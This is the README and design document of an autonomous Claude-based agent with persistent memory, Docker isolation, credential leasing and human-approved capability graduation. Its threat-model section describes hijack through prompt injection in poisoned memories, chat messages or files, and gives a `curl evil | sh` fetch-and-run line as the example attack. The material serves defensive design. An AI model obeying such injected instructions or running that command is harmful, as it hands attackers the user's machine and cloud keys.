# kagura-agent

[![CI](https://github.com/kagura-ai/kagura-agent/actions/workflows/ci.yml/badge.svg)](https://github.com/kagura-ai/kagura-agent/actions/workflows/ci.yml)
![Coverage](docs/coverage.svg)
[![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)
![Python 3.11+](https://img.shields.io/badge/python-3.11%2B-blue.svg)

**Memory-backed autonomous AI agent.** Claude — via the
[Agent SDK (Python)](https://docs.claude.com/en/api/agent-sdk) by default, or the sibling
[`kagura-brain`](https://github.com/kagura-ai/kagura-brain) claude/codex/ollama wrapper —
is the brain; [Kagura Memory Cloud](https://github.com/kagura-ai/memory-cloud) is the
persistent long-term memory backbone. A Docker security membrane and a Slack/Discord
cockpit wrap it. Driven from a CLI: `run` / `repl` / `serve` / `doctor` / `setup`.

> _Licensed under [Apache-2.0](LICENSE) (© 2026 Kagura AI). The GitHub repository is
> currently **private** — a public release is being prepared; the code is already
> OSS-licensed._

**Status — implemented skeleton, runnable.** The pure-Python core of every design
milestone (v0.1–v0.7; package version `0.5.0`) — brain seam, security membrane, credential
leasing, cockpit + HITL, capability graduation, egress-sealed brain-in-container — is built
and tested (50 test modules, `mypy --strict`, ≥95% coverage). The infrastructure edges
(real Docker, cloud STS/Cloudflare, the Slack/Discord/SDK clients) sit behind protocol
seams. **Everything below the Quickstart is the canonical design document** — architecture,
the security membrane, capability graduation, and the per-milestone
[Implementation status](#implementation-status-v01v07-skeleton).

---

## Quickstart

> kagura-agent is on PyPI — `pip install 'kagura-agent[claude]'` — and needs **two
> logins** before it will run. The full first-run setup is below; `kagura-agent doctor`
> tells you exactly what is still missing.

### Prerequisites

- **Python ≥ 3.11.**
- **Memory login — required to start.** Every `run` / `repl` / `serve` checks that Kagura
  Memory Cloud is reachable *before doing anything else* and **refuses to start** if it is
  not (a run is rejected, never silently degraded). Authenticate with the **separate
  `kagura` CLI** — `kagura auth login`. There is no fully-offline mode: `KAGURA_AGENT_MEMORY_DB`
  changes only *where* memories are stored, not this gate.
- **A brain.** The default `sdk` brain needs the `claude` extra **and** the Claude Code CLI
  signed in to your Pro/Max plan (or `ANTHROPIC_API_KEY`, which overrides subscription
  auth). The bare core ships with **no brain** — you pick an extra.
- **Docker** — only for `serve --container` and the live membrane.

### Get running

```bash
# 1. (recommended) isolate, then install WITH a brain extra (the bare core has none):
python -m venv .venv && source .venv/bin/activate    # Windows PowerShell: .venv\Scripts\Activate.ps1
pip install 'kagura-agent[claude]'    # default — Claude Agent SDK
# pip install 'kagura-agent[brain]'   # alternate — kagura-brain (claude/codex/ollama)

# 2. Authenticate (both logins are real prerequisites):
kagura auth login                 # Kagura Memory Cloud — the separate `kagura` CLI
claude                            # sign the Claude Code CLI into your plan…
# export ANTHROPIC_API_KEY=sk-…   # …or bring your own key (overrides subscription)

# 3. Preflight — reports exactly what is still missing:
kagura-agent doctor

# 4. Run a task:
kagura-agent run "summarize the repository layout"
```

### More ways to drive it

```bash
kagura-agent run --prompt-file task.md      # task body from a file…
cat task.md | kagura-agent run -            # …or from stdin (mutually exclusive with the inline task)
kagura-agent repl                           # interactive — each line continues the same context
kagura-agent run --session work "…"         # a named, resumable session (a later run resumes it)

# Cockpit on a chat transport — install the transport extra FIRST, or serve aborts:
pip install 'kagura-agent[slack]'           # or 'kagura-agent[discord]'
kagura-agent setup transport                # how to wire the bot token (it lives in the host env)
kagura-agent serve --transport slack        # add --container to run the brain BYOK in a sealed container
```

**Exit codes** — `0` ok · `2` usage/config error · `3` setup not ready (memory not logged
in, or the brain extra/CLI missing) · `4` `doctor` found a failing check.

### Troubleshooting

The exact first-run failures and their fixes:

| Symptom | Fix |
|---|---|
| `run` exits 3 — *"the Claude brain requires the optional `claude` extra"* | `pip install 'kagura-agent[claude]'` |
| `run` / `doctor` — *"memory-cloud is not reachable/authenticated"* | `kagura auth login` on the host (the separate `kagura` CLI) |
| `doctor` overall **FAIL** on a fresh checkout | Expected before steps 2–3 — read it per-row; a `brain` FAIL just means the brain isn't set up yet |
| `serve` exits 3 — *"the slack transport requires the optional `slack` extra"* | install the transport extra: `pip install 'kagura-agent[slack]'` (or `[discord]`) |
| `run` exits 2 — *"task must not be empty"* | the `--prompt-file` / stdin input was empty |
| `pytest` / `mypy` not found | dev tools live in the dev extra (from a clone): `pip install -e '.[dev]'` |

**Extras**: `claude` · `brain` · `slack` · `discord` · `aws` · `gcp` · `github` ·
`cloudflare` · `keyring` · `dev`. The brain is chosen per-deploy via `KAGURA_AGENT_BRAIN`
(`sdk` default, or `kagura-brain`) — see [Brain-provider seam](#brain-provider-seam).
Contributors install from a clone: `git clone` + `pip install -e '.[dev]'`, then `pytest`
and `mypy` (strict) — see [CONTRIBUTING.md](CONTRIBUTING.md).

---

## What kagura-agent is — and is not

A common misread is "it's an AI that calls `recall` / `reference` / `explore`".
That captures only the memory-reader role. The agent's defining capability is
the combination of **memory + actor**:

| | Narrow read (commodity) | What kagura-agent actually is |
|---|---|---|
| **Brain** | Generic chat LLM | Claude (via Agent SDK Python, subscription or API key) |
| **Memory** | Stateless or session-only | Kagura Memory Cloud as persistent backbone — accumulates across runs |
| **Hands** | None — just answers | shell exec / filesystem / git / Docker / Cloudflare / cloud APIs (via MCP) |
| **Time horizon** | One conversation | Long-running tasks resumable from memory state |
| **Differentiation** | Anyone with Claude Desktop + memory MCP plugin matches it | Cost-aware planning + failure-mode learning + sub-agent dispatch with memory handoff |

The agent is an **actor** in the topology — it lives entirely outside `memory-cloud`,
which it reaches CLI-first as its persistent backbone (the membrane leases a
short-lived, read-scoped token in; the host keeps the refresh token). It can be run
as a CLI or a long-running daemon.

---

## kagura-agent and kagura-engineer

kagura-agent and [`kagura-engineer`](https://github.com/kagura-ai/kagura-engineer)
are **two independent agents that share the same "memory + actor" thesis — not a
platform and an app running on it.**

- **kagura-agent** — a general, Docker-based, **high-freedom** autonomous actor:
  arbitrary domains, infra/cloud hands, a Slack/Discord cockpit, the security
  membrane, capability graduation. _v0.1–v0.7 skeleton implemented (Python core +
  tests), plus the egress-sealed brain-in-container and a pluggable
  Claude-SDK / kagura-brain (codex/ollama) backend; container/cloud/transport
  edges are protocol seams with their adapters wired for deployment._
- **kagura-engineer** — an independent, **coding-specialized** agent that drives
  a GitHub issue to a reviewed PR (`doctor` / `setup` / `run` / `review`).
  _Shipping today (CLI + tests)._

They are **separate repositories, separate codebases, on purpose** — engineer
does **not** run on agent's framework, and agent is not blocked on engineer.
Coupling them now would mean re-architecting working, tested code onto an
unbuilt abstraction (designing a platform from a single instance) — the
"abstraction tax before the moat" this project deliberately avoids. Revisit a
shared runtime only once a **second** specialized actor makes the real seams
visible.

What they share is kept **thin and proven, via libraries — not a framework**.
The narrowest, most-proven primitive goes first: the `MemoryClient` shape +
trust-tier discipline, shared through the existing
[`kagura-memory-python-sdk`](https://github.com/kagura-ai/kagura-memory-python-sdk).
Beyond that the relationship is informational, two-way:

- **engineer → agent (reference implementation).** Things agent specs as design,
  engineer has already built in the small and can be lifted from:
  - its narrow `MemoryClient` Protocol (append + scoped read, no admin) and the
    `_TRUST_FILTER = {"trust_tier": "trusted"}` recall filter **are** the
    "Memory provenance" membrane control (untrusted externally-ingested memories
    excluded from behaviour-influencing reads);
  - `LocalMemoryClient` (offline SQLite) is the self-host memory backend;
  - launching [`kagura-code-reviewer`](https://github.com/kagura-ai/kagura-code-reviewer)
    and gating on its verdict is a working model of sub-agent dispatch.
- **agent → engineer (the design ceiling).** The membrane, launcher
  (`CredentialBroker`/`Lease`), cockpit, and graduation curve are where engineer
  goes as it widens beyond a single trusted operator.

**Boundary rule:** anything coding-task-specific (issue→PR, the review loop)
lives in engineer; anything a *general* actor needs (membrane, cred leasing,
cockpit, multi-domain hands, capability graduation) is agent's. A shared
primitive (the `MemoryClient` shape, trust-tier discipline, eventually sub-agent
dispatch) should be **extracted into a shared library once it has proven out in
one of them — not copy-pasted, and not turned into a platform either side must
adopt.**

---

## Architecture

```
                    ┌───────────────────────────────────┐
                    │   Claude Agent SDK (Python)        │
                    │   subprocess-wraps Claude Code CLI │
                    │   → subscription auth inherits     │
                    └───────────────────────────────────┘
                                      │
                          orchestrates tool calls
                                      │
        ┌─────────────────────────────┼─────────────────────────────┐
        ▼                ▼            ▼            ▼               ▼
   ┌─────────┐   ┌───────────┐  ┌─────────┐  ┌─────────┐    ┌────────┐
   │ memory- │   │filesystem │  │  shell  │  │cloudflare│    │ custom │
   │ cloud   │   │   MCP     │  │   MCP   │  │   MCP   │    │  MCP   │
   │  MCP    │   │           │  │ (Docker │  │  / aws  │    │ per-   │
   │         │   │           │  │ -isolat)│  │  / gcp  │    │ tenant │
   └─────────┘   └───────────┘  └─────────┘  └─────────┘    └────────┘
        │
   recall / reference / explore  ← read past learnings
   remember / create_edge       ← write what was learned
   ingest_events                ← push cost ledger / task tracker
```

### Auth model

- **Python Agent SDK** wraps the Claude Code CLI as a subprocess →
  the user's Pro/Max subscription is inherited automatically.
- **Self-hosted / single-user mode**: flat subscription cost regardless
  of agent load (within Anthropic's cap-based metering: 5h rolling +
  weekly 7-day rolling). No per-token tracking required.
- **API-key (BYOK) mode**: where subscription inheritance isn't available,
  set `ANTHROPIC_API_KEY` (BYOK) instead.
- `ANTHROPIC_API_KEY` env, if set, overrides subscription auth.

This dual-path (subscription, or a BYOK API key) is the same pattern
memory-cloud already uses for LLM provider keys.

### Brain-provider seam

The seam was drawn so a second brain would be a **pure addition, not a rewrite**:
`core/session.py` never calls the Claude Agent SDK directly — it depends on a
`BrainProvider`, and all provider specifics live behind an engine. **That boundary
has now paid off** — two backends ship behind the same protocol, selected per
deploy by `KAGURA_AGENT_BRAIN` (`sdk`, the default, or `kagura-brain`):

- **`sdk`** — `SdkEngine`, the **Claude Agent SDK** (subscription-inherited Claude
  Code CLI). The default; existing runs are unchanged.
- **`kagura-brain`** — `KaguraBrainEngine`, wrapping the sibling
  [`kagura-brain`](https://github.com/kagura-ai/kagura-brain) one-shot library,
  whose `KAGURA_AGENT_BRAIN_BACKEND` picks **claude** or **codex**, with
  `KAGURA_AGENT_BRAIN_MODEL` to pin a model and `KAGURA_AGENT_BRAIN_LOCAL_PROVIDER`
  for a **local `--oss` ollama/lmstudio** brain (or `KAGURA_AGENT_BRAIN_ENDPOINT`
  + key for a BYO OpenAI-compatible gateway such as Ollama Cloud).

**`KAGURA_AGENT_PERMISSION_MODE`** (sdk backend only) sets the Agent SDK's headless
tool-approval policy: `default` | `acceptEdits` | `plan` | `bypassPermissions` |
`dontAsk` | `auto`. There is **no interactive approval channel in a headless run**,
so `default` dead-ends every mutating tool. The per-path default reflects *who*
drives the run: the **operator-typed `run` / `repl`** default to **`acceptEdits`**
(you ran the command at your own shell — the agent may write/edit files), while the
**`serve`** cockpit brain keeps the safe **`default`** (a chat participant is not
necessarily the operator, and the in-process serve brain is unsandboxed). Set the
variable explicitly to override on any path — e.g. `bypassPermissions` for full
autonomy (shell, git). A typo fails closed (exit 2). _Inside a `serve --container`
run the membrane, not this mode, bounds reach._

The original v1 design rule — _ship one brain, but never be Claude-shaped_ — is
what kept that codex/ollama backend a drop-in. It is restated below unchanged.

**The rule:** `core/session.py` never calls the Claude Agent SDK directly. It
depends on a `BrainProvider`. All Claude specifics live behind `ClaudeBrain`,
and `auth.py` becomes **per-provider** auth resolution rather than a
Claude-global resolver.

**Where the seam sits (decided): _above_ the agentic loop.** Both the Claude
Agent SDK and Codex CLI self-drive their own tool-calling loop, so the provider
**owns its loop**; `session.py` orchestrates _tasks and checkpoints_, never
individual tool calls. Drawing the seam below the loop (session.py driving each
tool call) would fit Claude but lock Codex out — the opposite of the goal.
`BrainEvent` normalization is the spot most likely to leak; don't over-design it
on paper — validate it against one real `recall → tool-call → result → continue`
MCP flow at first code.

```python
class BrainProvider(Protocol):
    name: str
    def resolve_auth(self) -> AuthContext: ...        # subscription-inherit | BYOK | API key
    def capabilities(self) -> BrainCaps: ...          # mcp, subagents, resume, …
    async def run(self, turn: Turn) -> AsyncIterator[BrainEvent]: ...

# Turn  = provider-agnostic inputs (task, mcp configs, tool results, budget)
# BrainEvent = normalized stream (text | tool-call | cost | done)
```

What crosses the seam vs what stays hidden behind an implementation:

| Agnostic (defined by kagura) | Provider-specific (behind the impl) |
|---|---|
| task / prompt, MCP server configs, tool results | subprocess invocation, CLI flags |
| normalized event stream (text, tool-call, cost, done) | the underlying CLI's event / parse format |
| checkpoint & session-state shape | how auth is inherited (subscription vs key) |
| budget signal | model id, context-window quirks |

**Hard constraint — memory must be reachable.** memory-cloud is the backbone,
reached **CLI-first** (`kagura auth login` on the host; the membrane leases a
short-lived, read-scoped access token into the container — the refresh token
never crosses). The _startup gate_ is therefore "memory is reachable +
authenticated via the CLI", **not** "the brain speaks MCP": a run where memory
is unreachable is rejected, never degraded. This gate is brain-independent
(`mcp/memory_cloud.py`), so memory does not couple to any one brain. MCP itself
is orthogonal and optional — Claude Code's `--mcp-config` carries *other* MCP
servers; memory does not depend on it.

**Auth is per-provider.** Claude inherits the subscription via the CLI
subprocess; a future Codex/OpenAI brain may only have API-key / BYOK. `auth.py`
resolves *per provider* and does not assume subscription exists. The
`ANTHROPIC_API_KEY` override stays a Claude-specific detail behind `ClaudeBrain`.

**Scope discipline (held).** The original cut shipped `ClaudeBrain` only — one
protocol, no speculative abstraction beyond it. The second backend (`kagura-brain`,
reaching codex + local/cloud ollama) was then added **behind that same, unchanged
protocol**, selected by one env var — exactly the "pure addition, not a rewrite"
the seam was insurance for. The protocol is still the whole abstraction; nothing
was generalized on paper ahead of the second real consumer.

---

## Differentiating capabilities

The four capabilities below are what make memory + actor worth more than
their sum. None of them are achievable with a stateless agent or a
memory-less actor.

### 1. Cost-aware planning

Before kicking off a multi-step task, the agent recalls past similar
tasks' actual cost (token spend, time, retries, failure modes) and
adjusts plan + budget accordingly. Example:

```
user: "deploy v0.16.1 to staging"

agent:
  → recall("deploy staging", filters={status: "failed"})
  → finds 2 past failures (Caddyfile permission trap, env-file omission)
  → adds explicit pre-flight checks for both before deploy
  → reserves 30% buffer over avg historical cost
```

### 2. Long-running task resume

Context window dies; the agent doesn't. Task state is checkpointed to
memory-cloud and resumed cleanly in a fresh session:

```
session 1 (interrupted):
  remember(type="task-checkpoint", details={
    step: 4, pending: ["test", "deploy"],
    granted_budget: {scope: ..., expires_at: ..., renewals_left: 2}  # NOT the live credential
  })

session 2 (resumed):
  recall("task-checkpoint", filters={task_id: ...}, k=1)
  → "continuing from step 4 of N — pending: [test, deploy]"
  → launcher re-acquire()s a fresh short-lived lease under the remaining budget
```

The checkpoint stores the **granted budget, never the live credential** (which
was `release()`d at checkpoint) — see the launcher's `CredentialBroker` / `Lease`
under "Security membrane". This is what lets a task be both long-running and
credential-short-lived at the same time.

### 3. Failure-mode learning

Every failure becomes a memory with a `prevents` edge to its fix:

```
remember(
  summary="Caddyfile cp fails when root-owned",
  type="bug-fix",
  details={trigger: "...", fix: "sudo chown ... && retry"}
)
create_edge(from=fix_memory, to=task_memory, type="prevents")
```

Next time the agent plans a similar task, the recall surfaces this fix
preemptively. Failure cost → 0 over time on recurring patterns.

### 4. Sub-agent dispatch with memory handoff

A large task spawns child agents; context is passed not as prompt
text but as memory IDs:

```
parent agent:
  remember(summary="task context for child", scope="working", ttl=3600)
  → returns memory_id

  dispatch(child_agent, prompt="recall memory_id=<...> and execute")

child agent:
  recall(memory_id=<...>)
  → child works on it, writes its own memories, finishes
  → parent recalls child's output memories to continue
```

Parent context window stays small; complex pipelines become composable.

---

## Phase 1 capability scope

Tightly scoped to validate the "memory + actor" thesis before broadening:

| Capability | In | Out |
|---|---|---|
| shell exec (Docker-isolated) | ✅ | host shell ❌ |
| filesystem read/write (project root) | ✅ | system-wide fs ❌ |
| git ops (clone, commit, push) | ✅ | rebase / force-push ❌ |
| `.env` and config file mgmt | ✅ | OS pkg install ❌ |
| Cloudflare DNS read | ✅ | DNS write (Phase 2) |
| `sudo apt install` etc. | ❌ Phase 2 | (surprisingly dangerous) |
| memory-cloud full MCP toolset | ✅ | — |

The "surprisingly dangerous" note on `sudo apt install` reflects a real
concern: package installation has the widest blast radius of any common
ops action. It gets gated behind explicit Phase 2 review.

> **Read this table as the _initial_ state of the graduation curve, not a fixed
> wall.** The In/Out split is where each capability *starts*; the **Security
> membrane** below governs how the "Out" / Phase-2 entries move (via HITL-gated
> capability graduation, per-category, fail-closed). Inside the container the
> agent already has full freedom — so an "Out" entry like DNS-write or
> `apt install` means "not granted to a run by default yet," not "the binary is
> absent." The membrane, not this table, is the source of truth for what a given
> run is actually allowed to reach.

---

## Security membrane (self-host v1)

**Core principle: the boundary worth defending is _what the container can
reach_, not _what runs inside it_.** Inside the container the agent has full
freedom (apt, arbitrary CLIs, Linux base) on a self-responsibility basis. That
freedom is only safe because the membrane controls what crosses in and out.

### Threat model: agent hijack, not user carelessness

The real risk is not "the user broke their own files." It is **agent hijack via
prompt injection**. The LLM reads untrusted content on every run — memory-cloud
recall results, Slack/Discord messages, web pages, file contents — any of which
can carry injected instructions. An agent with unrestricted apt + shell +
network is a _confused deputy_: a single poisoned memory or message can make it
run `curl evil | sh`, and standing credentials turn that into total cloud
compromise.

> "Self-responsibility" explicitly **includes the hijack risk**, not just "I
> deleted my own file." Scope covers "got hijacked and my keys were
> exfiltrated."

This model holds for **self-host single-user only**. Docker here is a
_convenience boundary, not a security boundary_. A shared/multi-tenant deployment
would need gVisor / Firecracker / microVM-class isolation — the self-responsibility
premise must not be carried into a shared environment.

**This must be a code gate, not a doc promise.** In a shared/multi-tenant mode,
selecting the Docker-only isolation profile is a **hard startup error**
(fail-closed): the run refuses to launch without a microVM-class profile. A
self-host-tuned default must not be able to leak into a shared environment via one
config flag.

### The membrane: what crosses, what does not

| Control point | Rule | Why |
|---|---|---|
| **Credentials** | No ambient env keys. Inject **per-task, scoped, short-lived** creds at launch. | A resident AWS/GCP/Cloudflare key + hijack = instant cloud-wide loss. |
| **`docker.sock`** | **Never mounted into an agent container.** | Mounting it = host root. Only the cockpit (trusted host process) speaks to Docker. |
| **Filesystem** | Mount **project root only**. No home / host FS. | Limits what a hijacked run can read or corrupt. |
| **Egress** | **Enforcing**, not just logged: a single egress proxy is the only route out (default-deny + allowlist + log). | A self-host operator has no on-call — egress must *block* during the window before a human reads the alert, not merely record. See `docs/operations.md`. |
| **Memory provenance** | Recall results carry a `source` / trust-tier. Externally-ingested memories (e.g. chat pulled in by an external connector) are **untrusted input**. | memory-cloud is read every run and ingests attacker-reachable chat — it is a cross-system injection channel (separate bot ids do not help; the *data* is shared). |
| **User namespace** | userns-remap / rootless Docker. | Container root ≠ host root. |

### Image composition: bake tools, inject secrets

Tools (binaries) and credentials are split by an absolute line. **Tools may be
baked; credentials and first-party code must be injected.** A baked binary is
harmless — only the standing key it would use is dangerous.

| | Baked into image | Injected at run |
|---|---|---|
| **Essential (L1)** | bash/coreutils, `git`, `curl`, `jq`, `ripgrep`, `openssh-client`, Python runtime (Agent SDK), `gh` | — |
| **MCP config** | connection URLs only | MCP tokens |
| **Language toolchains (L2)** | per-variant: `python`, `node`, `rust`… (version-pinned) | — |
| **Cloud CLIs** | only the cloud(s) actually used, as an L2 variant — `gh` in L1; `awscli`/`gcloud` per use; **Azure not baked** | scoped cloud creds |
| **Secrets** | **never** | all of them |
| **First-party code** (memory-cloud, sibling repos) | **never** (goes stale, couples versions) | mounted / pulled |

Images form a **`FROM` inheritance chain, not a 3-way choice**: L1 `base` is
built once; L2 variants (`python`, `aws`, …) inherit from it. **L3 is not an
image** — it is `apt install` inside a live container, the escape hatch for
the rare tool no variant carries. Cloud and language CLIs are heavy
(`gcloud` SDK is GB-class), version-drift-prone, and the widest supply-chain
surface — so they are bake-only-what-you-use, never bake-everything.

> v1 starts with **`base` + `python`** variants only. Add a language/cloud
> variant the day a task needs it; lean on L3 (apt) until then. Don't
> pre-build images you won't run.

**Distribute Dockerfiles, not prebuilt images.** The operator builds locally
from recipes (pulling upstream packages directly). This (a) sidesteps the
redistribution terms that bundling `awscli` v2 / `gcloud` into a shipped image
would trigger — see `docs/legal.md` — and (b) matches the self-host model. Pin
for reproducibility: **base image by digest, apt/pip via lockfiles**; defer
rebuild automation and any private registry to post-launch.

### The launcher: per-run capability binding

A baked image carries _capability inventory_; the **launcher** decides, per
task, _what of that inventory this run actually gets_:

```
launcher(task) →
  ├─ image    : pick one L2 variant (or bare base)
  ├─ creds    : scoped, short-lived, per-task injection
  ├─ mount    : project root only
  └─ egress   : per-task allowlist
  → docker run  (a zero-credential image, granted only this run's powers)
```

This `{image, creds, mount, egress}` 4-tuple **is** the capability-graduation
gate (below). The launcher is the only thing that calls `docker run`.

**Credentials are leased, not handed over.** The `creds` slot is a
`CredentialBroker` that issues a `Lease`, not a raw key:

```python
class CredentialBroker(Protocol):
    def acquire(self, scope: Scope) -> Lease: ...

class Lease(Protocol):
    def renew(self) -> None: ...     # STS: re-AssumeRole  | Cloudflare: re-mint token
    def release(self) -> None: ...   # STS: no-op          | Cloudflare: revoke token
```

This one abstraction absorbs both credential shapes (stateless STS-style vs
Cloudflare's stateful mint→use→revoke; see `docs/operations.md`) **and** resolves
the long-running-task vs short-lived-cred tension:

- **HITL approval grants a _budget_, not a credential** — "this task may hold
  `scope` for up to N hours, auto-renewing, ≤ M renewals." The broker mints
  short-lived leases (15 min–1 h each) and **renews them transparently** within
  the budget without re-prompting the human; budget exhaustion **fails closed**
  and re-prompts.
- **Checkpoint/resume composes cleanly**: a checkpoint stores the _granted
  budget_, never the live credential (which is `release()`d at checkpoint). A
  resumed run re-`acquire()`s under the remaining budget. So creds stay
  short-lived while multi-hour and resumable tasks still work.

Leases are tracked in a durable ledger so orphans can be swept on crash — see
`docs/operations.md` (credential lifecycle).

### Cockpit: a trusted host-direct process

The cockpit (Slack/Discord control surface, separate bot id `@kagura-agent`)
runs as a **long-lived process directly on the host — inside the trust
boundary**. It holds the bot token and is the only component besides the
launcher that touches Docker. **Agent containers are untrusted; the cockpit is
trusted. These never mix** — `docker.sock` reaches the cockpit, never an agent.

```
Slack/Discord DM ─event─▶ Cockpit (host, trusted)
                            │ 1. transport abstraction  (Slack/Discord/CLI → one Event)
                            │ 2. session registry        (thread ⇄ running container)
                            │ 3. intent router           (launch / continue / status / approve / kill)
                            │ 4. HITL approval           (cred/egress escalation via DM buttons)
                            ▼
                 launcher(task) ─▶ docker run (zero-cred image + scoped powers)
                            ▼
                  agent container (brain = Claude Code CLI) ─stdout/event─▶ back to thread
```

- **thread = session.** A top-level DM starts a new task (new container); a
  reply in that thread is a message to the running agent. Concurrency is
  expressed by the UI itself.
- **Transport is abstracted** (the UI-side mirror of the brain-swap seam):
  Slack (Bolt, Socket Mode — no public URL, fits self-host), Discord
  (discord.py), and a CLI adapter all normalize to one `Event`; the core is
  transport-agnostic.
- **HITL approval is the cockpit's reason to exist.** When the launcher needs
  powers beyond baseline, the cockpit asks the human in-DM (✅/❌ buttons). The
  approval log (who / when / what) accumulates into the trust score below.

### Capability graduation

The Phase 1 In/Out table is a **graduation curve, not a fixed list**. Dangerous
operations (DNS write, `apt install`, new cloud creds) start locked. As
success-memories accumulate in a category with zero failures, the agent
proposes unlocking it; the accumulated `create_edge(type="prevents")` history
**is** the trust score. Under full-freedom-inside-the-container, what graduates
is never "can it execute" but **"what image / creds / egress / mounts this run
is granted"** — i.e. the launcher's 4-tuple, gated by cockpit HITL.

**Thresholds.** These gate **when to _propose_ a graduation, not when to grant
one** — the human HITL approval is the real gate. That reframing is why the
numbers are moderate rather than paranoid: a too-high bar just means a
low-volume self-host user never sees a proposal at all. Defaults (config knobs,
tune against real run data):

| Knob | Default | Rationale |
|---|---|---|
| `min_successes` | **5** | Enough signal to surface a proposal; with a human as final gate, 10+ only adds friction for a single-user, low-volume host. |
| `min_distinct_tasks` | **3** | Anti-gaming: one repeated cron-like task must not farm trust into an unlock. |
| `failure_window` | **since last reset** | "Zero failures" is measured since the category was last locked/demoted, not over an arbitrary window. |
| `cooldown` | **7 days** | Forces evidence to accrue over time, not in one burst of same-day runs. |

A proposal fires only when **all** hold. The unlock itself is always a **HITL
proposal, never automatic**. **Fail-closed:** a single failure in a graduated
category demotes it (back to ask-every-time) and resets the counter. Trust is
**per-category** — graduating DNS-write grants nothing toward `apt install`. The
trust signal is the accumulated `prevents`-edge + success-memory count,
discounted by recency-weighted failures.

Two integrity rules keep graduation from becoming a hijack amplifier:

- **Input-trust gating.** A graduated capability is **not auto-applied to a run
  whose input includes untrusted (externally-ingested) memories** — such a run
  falls back to ask-every-time. Otherwise a poisoned memory inherits the
  standing trust the agent earned earlier.
- **Independent success signal.** "Success/failure" feeding the trust score must
  come from a signal the agent cannot forge (exit code, test result, human
  approval log) — **never the agent's own self-report**. A hijacked agent must
  not be able to manufacture its own graduation.

### Container hardening

Docker is a _convenience boundary_, so it is hardened as defense-in-depth while
accepting it is not airtight:

- userns-remap / rootless; run as a **non-root user** inside the container
- `--cap-drop=ALL`, add back only the capabilities the task needs
- `--security-opt no-new-privileges`; keep the **default seccomp profile**
  (never `--privileged`, never `--security-opt seccomp=unconfined`)
- **read-only rootfs** + tmpfs scratch; the project-root bind is the only
  writable mount
- no host network / PID / IPC namespaces; bridge networking behind the egress
  allowlist
- `--pids-limit`, memory/CPU caps (also contains runaway loops / DoS)
- **never** `docker.sock`, **never** host FS beyond project root

> Honest limit: a kernel 0-day defeats all of the above. For self-host
> single-user the residual risk is **accepted**; a shared/multi-tenant lane demands
> gVisor / Firecracker / microVM-class isolation. Restated here so the
> self-responsibility premise never silently crosses into a shared environment.

---

## Control surface internals (cockpit)

The membrane spec fixes _what_ the cockpit is (trusted host process, sole Docker
caller). This section fixes _how_ it is built. v1 keeps every part deliberately
dumb.

### Intent router — structural before semantic

Classify each incoming `Event` into an intent **structurally** before reaching
for any NLU:

| Intent | How it's recognized (v1) | Action |
|---|---|---|
| **launch** | a top-level DM (not in a thread) | `launcher(task)` → new container → open a thread |
| **continue** | a reply inside an existing session thread | forward the message to that container's brain |
| **status** | slash/keyword (`/status`) | render the session registry |
| **approve** | an interactive button payload | resolve a pending HITL request |
| **kill** | slash/keyword (`/kill`) or the ❌ button | SIGTERM the container, free the session |

`launch` vs `continue` is **thread position, not language** — no model call
needed. Only genuinely ambiguous free-text falls back to the brain to classify.

> **Injection-safety:** the fallback classifier runs untrusted DM text through
> an LLM **inside the trusted host process**. It must be a **tool-less,
> credential-less, egress-less** sandboxed brain (pure classification) — never
> the same context that holds the cockpit's root credential. Otherwise the
> cockpit itself becomes a prompt-injection surface.

### Session registry

```
thread_id → Session{
  container_id, image, granted_caps,
  status: launching|running|awaiting_approval|done|killed,
  task, created_at
}
```

v1 is an in-memory dict **checkpointed to memory-cloud**, so a cockpit restart
recovers live sessions. On restart, **reconcile** the registry against
`docker ps` (adopt survivors, mark vanished ones `done/killed`).

### HITL approval flow

```
agent run needs powers > baseline
   └─▶ launcher emits CapabilityRequest{caps, reason, task}
        └─▶ cockpit posts an interactive message (✅/❌) to the thread
             └─▶ human decides  ──▶ launcher injects (or denies) the scoped cred/egress
                  └─▶ decision logged to memory-cloud  (feeds the trust score)
```

Default **deny on timeout**. Every decision (who / when / what / outcome) is a
memory — this log _is_ the graduation evidence base.

### Transport adapter interface

```python
class Transport(Protocol):
    async def listen(self) -> AsyncIterator[Event]: ...
    async def send(self, thread_id: str, reply: Reply) -> None: ...
    async def ask(self, thread_id: str, prompt: str, options: list[str]) -> str: ...  # HITL
```

Slack (Bolt, **Socket Mode** — no public URL), Discord (discord.py), and a CLI
adapter all normalize to one `Event`. **The core never imports a transport
SDK** — same discipline as the brain-provider seam, applied to the UI edge.

### Output streaming

Agent stdout/events are **batched, not per-token**: post tool-calls as they
happen, stream final text in readable chunks. Avoids flooding a DM thread with
token spam while keeping the run observable.

### What shipped

The vertical slice landed first on the **CLI adapter** — task in → launcher →
zero-cred container → reply — then **Slack (Bolt, Socket Mode) and Discord
normalizers were added as pure additions** behind the same `Transport` protocol,
no core change, driven by `kagura-agent serve --transport slack|discord` (with an
operator-identity gate on HITL approvals so only the configured operator can
`/approve`). Intents `launch / continue / status / approve / kill` and the
cred/egress HITL type are all wired; a richer status dashboard is still future.

> On the CLI the same intents map without thread structure: `launch` = a new
> `kagura-agent run` invocation, `continue` = stdin to the live session,
> `approve` = an inline prompt, `kill` = SIGINT. The thread-position rules above
> are the chat-transport binding of these same intents, added later.

---

## Operations & legal

Two concerns live in dedicated docs to keep this file focused on design:

- **[`docs/operations.md`](docs/operations.md)** — incident runbook: hijack
  detection tripwires, contain→rotate→investigate→eradicate→recover, and the
  scoped-cred key-rotation procedure (root cred = crown jewel, host-only).
- **[`docs/legal.md`](docs/legal.md)** — legal posture: the two open ToS
  questions (subscription-via-CLI automation; operator self-responsibility) and
  pre-launch action items held for CLO review. Flags questions, reaches no
  binding conclusion.
- **[`docs/extending.md`](docs/extending.md)** — giving the agent new API hands:
  custom MCP servers (`--mcp-config`), shell + egress allowlist, and per-task
  cloud cred leasing — with the no-baked-secrets rule that spans all three.

---

## What kagura-agent is NOT

To prevent scope creep, several adjacent things are explicitly out of scope:

- **NOT a chat front-end for memory-cloud.** Querying memory-cloud as a chat is
  covered by its existing MCP server + any MCP-capable client (Claude Desktop
  etc.). The agent's Slack/Discord surface is a **cockpit for driving the agent**
  (launch / steer / approve / kill tasks — see "Control surface internals"), not
  a window onto memory-cloud. Different job, separate bot id (`@kagura-agent`).
- **NOT a fine-tuned model.** It runs base Claude, not a customer-specific LLM.
  Custom-model / dataset concerns live in a separate component.
- **NOT an ingestion source.** Slack / Teams chat ingestion belongs to a separate
  connector worker. The agent may *use* those memories, not produce them.
